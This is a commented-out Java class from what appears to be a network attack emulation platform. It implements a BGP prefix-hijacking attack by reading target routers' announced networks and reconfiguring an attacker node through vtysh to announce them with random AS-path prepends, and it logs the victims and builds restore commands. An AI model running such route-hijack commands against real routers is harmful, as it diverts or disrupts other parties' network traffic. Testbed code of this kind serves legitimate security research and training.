// package com.routebox.manager.attack.bgp;

// import com.routebox.entity.index.AttackLog;
// import com.routebox.entity.index.auxiliary.BgpRouteEntry;
// import com.routebox.manager.InteractionManager;
// import com.routebox.util.IpBgpUtil;
// import com.routebox.util.TimeUtil;

// import java.util.*;
// import java.util.concurrent.ConcurrentHashMap;

// /**
//  * @Description Fake-Prefix Hijack Attack Handler
//  * @Date 2025/3/29
//  * @Author Screep
//  **/
// public class FakePrefixHijackingAttackHandler extends BgpAttackHandler {

//     public FakePrefixHijackingAttackHandler(Integer sourceNodeId, List<Integer> targetNodeIds) {
//         super(sourceNodeId, targetNodeIds, "Fake-prefix Hijacking");
//     }

//     @Override
//     public boolean attack() {
//         List<Integer> targetNodeIds = getTargetIds();

//         InteractionManager.clearWsResponse();
//         InteractionManager.sendCmd(targetNodeIds, "vtysh -c 'show running-config'");
//         ConcurrentHashMap<Integer, List<String>> wsResponseMap = InteractionManager.getWsResponse();
//         for (Integer nodeId : targetNodeIds) {
//             List<String> networkPrefixes = IpBgpUtil.parseNetworkIps(wsResponseMap.get(nodeId));
//             if (!networkPrefixes.isEmpty()) {
//                 focusedIdIpMap.put(nodeId, networkPrefixes.get(random.nextInt(networkPrefixes.size())));
//             }
//         }

//         if (focusedIdIpMap.isEmpty()) return false;

//         StringBuilder apBuilder = new StringBuilder();
//         apBuilder.append("Node [")
//                 .append(getAttackerId())
//                 .append("] launched ")
//                 .append(ATTACK_TYPE)
//                 .append(" attack at ")
//                 .append(TimeUtil.getNowTimeStr())
//                 .append(", the following announced Fake-IP prefixes are:\n");

//         InteractionManager.clearWsResponse();
//         InteractionManager.sendCmd(getAttackerId(), "vtysh -c 'show ip bgp'");
//         List<String> lines = InteractionManager.getWsResponse().get(getAttackerId());
//         List<BgpRouteEntry> bgpRouteEntries = IpBgpUtil.parseRouteEntries(lines, new ArrayList<>(focusedIdIpMap.values()));

//         InteractionManager.clearWsResponse();

//         HashMap<String, Integer> ipPrependMap = new HashMap<>();
//         bgpRouteEntries.forEach(bgpRouteEntry -> {
//             String ip = bgpRouteEntry.getIpPrefix();
//             String path = bgpRouteEntry.getPath();
//             if (path.equals("i")) {
//                 ipPrependMap.put(ip, 1);
//             } else {
//                 // Firstly remove " i" and then split by space
//                 int pathLen = path.substring(0, path.length() - 2).split(" ").length;
//                 // Randomly generate fake prefix number in range (1, pathLen-1)
//                 int fakeNum = random.nextInt(Math.max(1, pathLen - 1)) + 1;
//                 ipPrependMap.put(ip, fakeNum);
//             }
//         });
//         Set<Integer> prependNumset = new HashSet<>(ipPrependMap.values());

//         StringBuilder baseCmd = new StringBuilder("vtysh -c 'configure'");
//         StringBuilder restoreCmd = new StringBuilder("vtysh -c 'configure'");

//         for (Integer prependNum : prependNumset) {
//             baseCmd.append(" -c 'router bgp' -c 'route-map FAKE_")
//                     .append(prependNum).append(" permit 10'")
//                     .append(" -c 'set as-path prepend ");
//             restoreCmd.append(" -c 'router bgp' -c 'no route-map FAKE_").append(prependNum).append(" permit 10'");
//             apBuilder.append("Add fake prefixes: ");
//             for (int i = 0; i < prependNum; i++) {
//                 // Randomly generate fake prefix in range (1000, 60000)
//                 int randNum = random.nextInt(60000) + 1000;
//                 baseCmd.append(randNum);
//                 apBuilder.append(randNum).append(" ");
//                 if (i == prependNum - 1) {
//                     baseCmd.append("'");
//                 } else {
//                     baseCmd.append(" ");
//                 }
//             }
//             apBuilder.append("\n");
//             baseCmd.append(" -c 'exit'");
//         }

//         baseCmd.append(" -c 'router bgp'");
//         restoreCmd.append(" -c 'router bgp'");

//         // Construct Attack Commands
//         focusedIdIpMap.forEach((nodeId, ip) -> {
//             baseCmd.append(" -c 'network ")
//                     .append(ip)
//                     .append(" route-map FAKE_")
//                     .append(ipPrependMap.get(ip))
//                     .append("'");
//             restoreCmd.append(" -c 'no network ").append(ip).append("'");
//             apBuilder.append("Node [").append(nodeId).append("]").append(" with fake prefixes: ").append(ip);
//         });

//         String cmd = baseCmd.toString();
//         restoreCmdList.add(restoreCmd.toString());
//         InteractionManager.sendCmd(getAttackerId(), cmd);

//         postAttack(getAttackLog(apBuilder.toString()));

//         return true;
//     }

//     private AttackLog getAttackLog(String attackProcess) {
//         AttackLog attackLog = new AttackLog();
//         attackLog.setAttackers(List.of(getAttackerId()));
//         attackLog.setVictims(getTargetIds());
//         attackLog.setAttackProcess(attackProcess);

//         return attackLog;
//     }
// }